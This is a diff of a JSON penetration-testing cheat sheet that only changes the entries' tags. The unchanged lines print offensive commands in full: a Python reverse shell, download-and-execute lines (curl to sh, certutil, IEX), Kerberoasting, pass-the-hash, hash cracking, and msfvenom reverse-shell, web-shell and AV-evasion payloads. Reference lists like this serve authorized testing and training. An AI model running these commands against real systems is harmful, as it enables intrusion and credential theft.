@@ -5,8 +5,8 @@
     "command": "nmap -sV -sC -p- <ip> -oN scan_<ip>.txt",
     "description": "Full version & script scan on all ports",
     "tags": [
-      "nmap",
-      "scan"
+      "linux",
+      "windows"
     ]
   },
   {
@@ -15,8 +15,8 @@
     "command": "nmap -T4 -F <ip>",
     "description": "Fast scan on common ports",
     "tags": [
-      "nmap",
-      "quick"
+      "linux",
+      "windows"
     ]
   },
   {
@@ -25,9 +25,8 @@
     "command": "nmap -sU --top-ports 200 <ip> -oN udp_<ip>.txt",
     "description": "UDP scan on top 200 ports",
     "tags": [
-      "nmap",
-      "udp",
-      "scan"
+      "linux",
+      "windows"
     ]
   },
   {
@@ -36,9 +35,7 @@
     "command": "gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt",
     "description": "Directory brute-force with common wordlist",
     "tags": [
-      "gobuster",
-      "web",
-      "fuzz"
+      "web"
     ]
   },
   {
@@ -47,9 +44,7 @@
     "command": "ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt",
     "description": "Fast web fuzzer",
     "tags": [
-      "ffuf",
-      "web",
-      "fuzz"
+      "web"
     ]
   },
   {
@@ -58,9 +53,7 @@
     "command": "nikto -h http://<ip> -o nikto_<ip>.txt",
     "description": "Web server vulnerability scanner",
     "tags": [
-      "nikto",
-      "web",
-      "vuln"
+      "web"
     ]
   },
   {
@@ -69,8 +62,6 @@
     "command": "sqlmap -u 'http://<ip>/page?id=1' --batch --dbs",
     "description": "Auto SQL injection, enumerate databases",
     "tags": [
-      "sqlmap",
-      "sqli",
       "web"
     ]
   },
@@ -80,8 +71,7 @@
     "command": "enum4linux -a <ip>",
     "description": "Enumerate SMB shares, users, groups",
     "tags": [
-      "smb",
-      "enum"
+      "windows"
     ]
   },
   {
@@ -90,8 +80,7 @@
     "command": "smbmap -H <ip> -u <user> -p <password>",
     "description": "Map SMB shares with credentials",
     "tags": [
-      "smb",
-      "shares"
+      "windows"
     ]
   },
   {
@@ -100,9 +89,8 @@
     "command": "ldapsearch -x -H ldap://<ip> -b 'dc=<domain>,dc=<tld>' '(objectClass=*)'",
     "description": "Anonymous LDAP enumeration",
     "tags": [
-      "ldap",
-      "enum",
-      "ad"
+      "ad",
+      "windows"
     ]
   },
   {
@@ -111,9 +99,8 @@
     "command": "ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b 'dc=<domain>,dc=<tld>' '(objectClass=person)'",
     "description": "Enumerate AD users via LDAP with credentials",
     "tags": [
-      "ldap",
       "ad",
-      "users"
+      "windows"
     ]
   },
   {
@@ -122,10 +109,9 @@
     "command": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -no-pass -dc-ip <ip> -outputfile asrep_hashes.txt",
     "description": "AS-REP Roasting - get hashes for accounts without pre-auth",
     "tags": [
-      "kerberos",
+      "ad",
       "asrep",
-      "impacket",
-      "ad"
+      "windows"
     ]
   },
   {
@@ -134,10 +120,9 @@
     "command": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerberoast_hashes.txt",
     "description": "Kerberoasting - extract TGS hashes for cracking",
     "tags": [
-      "kerberos",
+      "ad",
       "kerberoast",
-      "impacket",
-      "ad"
+      "windows"
     ]
   },
   {
@@ -146,8 +131,8 @@
     "command": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<lhost>\",<lport>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
     "description": "Python3 reverse shell one-liner",
     "tags": [
-      "revshell",
-      "python"
+      "linux",
+      "revshell"
     ]
   },
   {
@@ -156,8 +141,8 @@
     "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
     "description": "Linux privilege escalation script",
     "tags": [
-      "privesc",
-      "linux"
+      "linux",
+      "privesc"
     ]
   },
   {
@@ -167,8 +152,7 @@
     "description": "Windows privilege escalation script",
     "tags": [
       "privesc",
-      "windows",
-      "winpeas"
+      "windows"
     ]
   },
   {
@@ -177,8 +161,8 @@
     "command": "nc -lvnp <lport>",
     "description": "Start a netcat listener",
     "tags": [
-      "nc",
-      "listener"
+      "linux",
+      "windows"
     ]
   },
   {
@@ -187,9 +171,8 @@
     "command": "hashcat <hashfile> /usr/share/wordlists/rockyou.txt --force",
     "description": "Crack hashes with rockyou, auto-detect mode",
     "tags": [
-      "hashcat",
       "crack",
-      "password"
+      "wordlist"
     ]
   },
   {
@@ -198,9 +181,8 @@
     "command": "john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt",
     "description": "Crack hashes with John using rockyou",
     "tags": [
-      "john",
       "crack",
-      "password"
+      "wordlist"
     ]
   },
   {
@@ -209,9 +191,9 @@
     "command": "certutil -urlcache -f http://<lhost>/<file> <file>",
     "description": "Download file via certutil (Windows)",
     "tags": [
-      "windows",
+      "ad",
       "download",
-      "certutil"
+      "windows"
     ]
   },
   {
@@ -220,9 +202,9 @@
     "command": "certutil -urlcache -split -f http://<lhost>/<file> C:\\Users\\Public\\<file>",
     "description": "Download file via certutil with split flag",
     "tags": [
-      "windows",
+      "ad",
       "download",
-      "certutil"
+      "windows"
     ]
   },
   {
@@ -231,9 +213,9 @@
     "command": "bitsadmin /transfer job http://<lhost>/<file> C:\\Users\\Public\\<file>",
     "description": "Download file via BITSAdmin (Windows)",
     "tags": [
-      "windows",
+      "ad",
       "download",
-      "bitsadmin"
+      "windows"
     ]
   },
   {
@@ -242,9 +224,8 @@
     "command": "iwr -Uri http://<lhost>/<file> -OutFile <file>",
     "description": "Download file via Invoke-WebRequest (short form)",
     "tags": [
-      "windows",
-      "powershell",
-      "download"
+      "download",
+      "windows"
     ]
   },
   {
@@ -253,9 +234,8 @@
     "command": "Invoke-WebRequest -Uri http://<lhost>/<file> -OutFile C:\\Users\\Public\\<file>",
     "description": "Download file via Invoke-WebRequest (full)",
     "tags": [
-      "windows",
-      "powershell",
-      "download"
+      "web",
+      "windows"
     ]
   },
   {
@@ -264,10 +244,9 @@
     "command": "(New-Object System.Net.WebClient).DownloadString('http://<lhost>/<file>.ps1') | IEX",
     "description": "Download and execute PowerShell script in memory",
     "tags": [
-      "windows",
-      "powershell",
       "download",
-      "execute"
+      "execute",
+      "windows"
     ]
   },
   {
@@ -276,10 +255,7 @@
     "command": "xfreerdp3 /v:<ip> /u:<user> /p:<password> /dynamic-resolution /cert:ignore +clipboard",
     "description": "RDP connection with password",
     "tags": [
-      "rdp",
-      "remote",
-      "windows",
-      "xfreerdp"
+      "windows"
     ]
   },
   {
@@ -288,11 +264,8 @@
     "command": "xfreerdp3 /v:<ip> /u:<user> /pth:<ntlm> /dynamic-resolution /cert:ignore +clipboard",
     "description": "RDP via Pass-the-Hash (NTLM)",
     "tags": [
-      "rdp",
-      "remote",
-      "windows",
       "pth",
-      "xfreerdp"
+      "windows"
     ]
   },
   {
@@ -302,9 +275,7 @@
     "description": "Crack ZIP password with fcrackzip",
     "tags": [
       "crack",
-      "zip",
-      "fcrackzip",
-      "password"
+      "wordlist"
     ]
   },
   {
@@ -313,10 +284,7 @@
     "command": "zip2john <file>.zip > zip.john && john zip.john",
     "description": "Crack ZIP password with John the Ripper",
     "tags": [
-      "crack",
-      "zip",
-      "john",
-      "password"
+      "crack"
     ]
   },
   {
@@ -325,9 +293,7 @@
     "command": "cat <wordlist> | 7za t <file>.7z",
     "description": "Brute-force 7z archive with wordlist",
     "tags": [
-      "crack",
-      "7z",
-      "password"
+      "wordlist"
     ]
   },
   {
@@ -336,10 +302,7 @@
     "command": "7z2john <file>.7z > 7zhash.john && john 7zhash.john",
     "description": "Crack 7z password with John the Ripper",
     "tags": [
-      "crack",
-      "7z",
-      "john",
-      "password"
+      "crack"
     ]
   },
   {
@@ -349,9 +312,7 @@
     "description": "Crack PDF password with pdfcrack",
     "tags": [
       "crack",
-      "pdf",
-      "pdfcrack",
-      "password"
+      "wordlist"
     ]
   },
   {
@@ -360,9 +321,6 @@
     "command": "qpdf --password=<password> --decrypt <encrypted_pdf>.pdf <plaintext_pdf>.pdf",
     "description": "Decrypt PDF once password is known",
     "tags": [
-      "crack",
-      "pdf",
-      "qpdf",
       "decrypt"
     ]
   },
@@ -373,10 +331,7 @@
     "description": "Crack KeePass database with John",
     "tags": [
       "crack",
-      "keepass",
-      "kdbx",
-      "john",
-      "password"
+      "wordlist"
     ]
   },
   {
@@ -386,9 +341,8 @@
     "description": "Crack Office document password with John",
     "tags": [
       "crack",
-      "office",
-      "john",
-      "password"
+      "windows",
+      "wordlist"
     ]
   },
   {
@@ -398,10 +352,8 @@
     "description": "Crack MD5 (phpass) — WordPress / Joomla",
     "tags": [
       "crack",
-      "hashcat",
-      "md5",
-      "wordpress",
-      "joomla"
+      "web",
+      "wordlist"
     ]
   },
   {
@@ -411,9 +363,9 @@
     "description": "Crack MD5 (phpass) with best64 rules",
     "tags": [
       "crack",
-      "hashcat",
-      "md5",
-      "rules"
+      "rules",
+      "web",
+      "wordlist"
     ]
   },
   {
@@ -423,9 +375,9 @@
     "description": "Crack Kerberos TGS hashes after Kerberoasting",
     "tags": [
       "crack",
-      "hashcat",
-      "kerberos",
-      "kerberoast"
+      "kerberoast",
+      "windows",
+      "wordlist"
     ]
   },
   {
@@ -435,9 +387,8 @@
     "description": "Crack LM hashes",
     "tags": [
       "crack",
-      "hashcat",
-      "lm",
-      "windows"
+      "windows",
+      "wordlist"
     ]
   },
   {
@@ -447,9 +398,8 @@
     "description": "Crack NTLM hashes",
     "tags": [
       "crack",
-      "hashcat",
-      "ntlm",
-      "windows"
+      "windows",
+      "wordlist"
     ]
   },
   {
@@ -459,9 +409,8 @@
     "description": "Crack NTLMv1 hashes",
     "tags": [
       "crack",
-      "hashcat",
-      "ntlmv1",
-      "windows"
+      "windows",
+      "wordlist"
     ]
   },
   {
@@ -471,10 +420,8 @@
     "description": "Crack NTLMv2 hashes (e.g. from Responder)",
     "tags": [
       "crack",
-      "hashcat",
-      "ntlmv2",
       "windows",
-      "responder"
+      "wordlist"
     ]
   },
   {
@@ -483,10 +430,9 @@
     "command": "hashcat -m 5600 -a 1 <hashfile> <wordlist> <wordlist>",
     "description": "Crack NTLMv2 with combination attack",
     "tags": [
+      "combination",
       "crack",
-      "hashcat",
-      "ntlmv2",
-      "combination"
+      "windows"
     ]
   },
   {
@@ -496,8 +442,6 @@
     "description": "Generate custom wordlist by applying rules to keywords",
     "tags": [
       "crack",
-      "hashcat",
-      "wordlist",
       "rules"
     ]
   },
@@ -507,11 +451,8 @@
     "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
     "description": "Windows x64 single-stage reverse shell EXE",
     "tags": [
-      "msfvenom",
       "windows",
-      "x64",
-      "shell",
-      "exe"
+      "x64"
     ]
   },
   {
@@ -520,11 +461,9 @@
     "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o metershell.exe",
     "description": "Windows x64 Meterpreter reverse shell EXE",
     "tags": [
-      "msfvenom",
-      "windows",
-      "x64",
       "meterpreter",
-      "exe"
+      "windows",
+      "x64"
     ]
   },
   {
@@ -533,12 +472,9 @@
     "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x64/xor_dynamic -f exe -o shell_en.exe",
     "description": "Windows x64 reverse shell with XOR encoder (AV evasion)",
     "tags": [
-      "msfvenom",
-      "windows",
-      "x64",
-      "shell",
       "encoded",
-      "evasion"
+      "windows",
+      "x64"
     ]
   },
   {
@@ -547,12 +483,10 @@
     "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -e x64/xor_dynamic -i 5 -f exe -o metershell_en.exe",
     "description": "Windows x64 Meterpreter with XOR encoder x5 iterations (AV evasion)",
     "tags": [
-      "msfvenom",
-      "windows",
-      "x64",
-      "meterpreter",
       "encoded",
-      "evasion"
+      "meterpreter",
+      "windows",
+      "x64"
     ]
   },
   {
@@ -561,13 +495,9 @@
     "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -a x86 -e x86/shikata_ga_nai -f exe -o metershell_en.exe",
     "description": "Windows x86 Meterpreter with shikata_ga_nai encoder (AV evasion)",
     "tags": [
-      "msfvenom",
-      "windows",
-      "x86",
       "meterpreter",
-      "shikata",
-      "encoded",
-      "evasion"
+      "windows",
+      "x86"
     ]
   },
   {
@@ -576,11 +506,9 @@
     "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o metershell.exe",
     "description": "Windows x86 multi-stage Meterpreter reverse shell",
     "tags": [
-      "msfvenom",
-      "windows",
-      "x86",
       "meterpreter",
-      "exe"
+      "windows",
+      "x86"
     ]
   },
   {
@@ -589,11 +517,10 @@
     "command": "msfvenom -p windows/meterpreter/bind_tcp LHOST=<lhost> LPORT=<lport> -f exe -o metershell_bind.exe",
     "description": "Windows x86 Meterpreter bind shell",
     "tags": [
-      "msfvenom",
-      "windows",
-      "x86",
+      "bind",
       "meterpreter",
-      "bind"
+      "windows",
+      "x86"
     ]
   },
   {
@@ -602,11 +529,8 @@
     "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o shell.dll",
     "description": "Windows x64 reverse shell as DLL (DLL hijacking / sideloading)",
     "tags": [
-      "msfvenom",
       "windows",
-      "x64",
-      "shell",
-      "dll"
+      "x64"
     ]
   },
   {
@@ -615,10 +539,8 @@
     "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o installer.msi",
     "description": "Windows reverse shell as MSI installer",
     "tags": [
-      "msfvenom",
       "windows",
-      "shell",
-      "msi"
+      "x64"
     ]
   },
   {
@@ -627,10 +549,7 @@
     "command": "msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
     "description": "Windows CMD multi-stage reverse shell",
     "tags": [
-      "msfvenom",
-      "windows",
-      "shell",
-      "exe"
+      "windows"
     ]
   },
   {
@@ -639,10 +558,8 @@
     "command": "msfvenom -p windows/adduser USER=<user> PASS=<password> -f exe -o useradd.exe",
     "description": "Windows payload to add a local user account",
     "tags": [
-      "msfvenom",
-      "windows",
-      "adduser",
-      "privesc"
+      "privesc",
+      "windows"
     ]
   },
   {
@@ -651,11 +568,8 @@
     "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f asp -o metershell.asp",
     "description": "ASP Meterpreter shell (IIS web shell)",
     "tags": [
-      "msfvenom",
-      "windows",
       "meterpreter",
-      "asp",
-      "web"
+      "windows"
     ]
   },
   {
@@ -664,11 +578,9 @@
     "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o metershell.elf",
     "description": "Linux x86 multi-stage Meterpreter reverse shell",
     "tags": [
-      "msfvenom",
       "linux",
-      "x86",
       "meterpreter",
-      "elf"
+      "x86"
     ]
   },
   {
@@ -677,12 +589,10 @@
     "command": "msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<lhost> LPORT=<lport> -f elf -o metershell_bind.elf",
     "description": "Linux x86 Meterpreter bind shell",
     "tags": [
-      "msfvenom",
-      "linux",
-      "x86",
-      "meterpreter",
       "bind",
-      "elf"
+      "linux",
+      "meterpreter",
+      "x86"
     ]
   },
   {
@@ -691,11 +601,8 @@
     "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf",
     "description": "Linux x64 single-stage reverse shell",
     "tags": [
-      "msfvenom",
       "linux",
-      "x64",
-      "shell",
-      "elf"
+      "x64"
     ]
   },
   {
@@ -704,12 +611,9 @@
     "command": "msfvenom -p linux/x64/shell_bind_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell_bind.elf",
     "description": "Linux x64 single-stage bind shell",
     "tags": [
-      "msfvenom",
-      "linux",
-      "x64",
-      "shell",
       "bind",
-      "elf"
+      "linux",
+      "x64"
     ]
   },
   {
@@ -718,11 +622,7 @@
     "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war -o shell.war",
     "description": "Java JSP reverse shell WAR — upload to Apache Tomcat",
     "tags": [
-      "msfvenom",
       "java",
-      "tomcat",
-      "shell",
-      "war",
       "web"
     ]
   },
@@ -732,10 +632,7 @@
     "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw -o shell.jsp",
     "description": "Java JSP reverse shell raw file",
     "tags": [
-      "msfvenom",
       "java",
-      "shell",
-      "jsp",
       "web"
     ]
   },
@@ -745,9 +642,6 @@
     "command": "msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -f raw -o shell.php",
     "description": "PHP reverse shell payload",
     "tags": [
-      "msfvenom",
-      "php",
-      "shell",
       "web"
     ]
   },
@@ -757,10 +651,8 @@
     "command": "msfvenom -p osx/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f macho -o shell.macho",
     "description": "macOS x86 reverse shell Mach-O binary",
     "tags": [
-      "msfvenom",
       "macos",
-      "shell",
-      "macho"
+      "x86"
     ]
   },
   {
@@ -769,11 +661,9 @@
     "command": "msfvenom -p osx/x86/shell_bind_tcp LHOST=<lhost> LPORT=<lport> -f macho -o shell_bind.macho",
     "description": "macOS x86 bind shell Mach-O binary",
     "tags": [
-      "msfvenom",
-      "macos",
-      "shell",
       "bind",
-      "macho"
+      "macos",
+      "x86"
     ]
   },
   {
@@ -782,10 +672,8 @@
     "command": "msfvenom -p cmd/unix/reverse_python LHOST=<lhost> LPORT=<lport> -f raw -o shell.py",
     "description": "Python reverse shell one-liner script",
     "tags": [
-      "msfvenom",
-      "python",
-      "shell",
-      "unix"
+      "linux",
+      "windows"
     ]
   },
   {
@@ -794,10 +682,7 @@
     "command": "msfvenom -p cmd/unix/reverse_bash LHOST=<lhost> LPORT=<lport> -f raw -o shell.sh",
     "description": "Bash reverse shell script",
     "tags": [
-      "msfvenom",
-      "bash",
-      "shell",
-      "unix"
+      "linux"
     ]
   },
   {
@@ -806,10 +691,8 @@
     "command": "msfvenom -p cmd/unix/reverse_perl LHOST=<lhost> LPORT=<lport> -f raw -o shell.pl",
     "description": "Perl reverse shell script",
     "tags": [
-      "msfvenom",
-      "perl",
-      "shell",
-      "unix"
+      "linux",
+      "windows"
     ]
   },
   {
@@ -817,20 +700,14 @@
     "name": "MSFvenom - List payloads",
     "command": "msfvenom -l payloads",
     "description": "List all available msfvenom payloads",
-    "tags": [
-      "msfvenom",
-      "reference"
-    ]
+    "tags": []
   },
   {
     "category": "Exploit",
     "name": "MSFvenom - List payload options",
     "command": "msfvenom -p <payload> --list-options",
     "description": "Show all options for a specific payload",
-    "tags": [
-      "msfvenom",
-      "reference"
-    ]
+    "tags": []
   },
   {
     "category": "Exploit",
@@ -838,11 +715,8 @@
     "command": "nim c -d:mingw --app:gui -o:shell.exe rev_shell.nim",
     "description": "Compile Nim reverse shell EXE — bypasses Avast/common AV",
     "tags": [
-      "nim",
-      "windows",
-      "shell",
       "evasion",
-      "av"
+      "windows"
     ]
   }
 ]
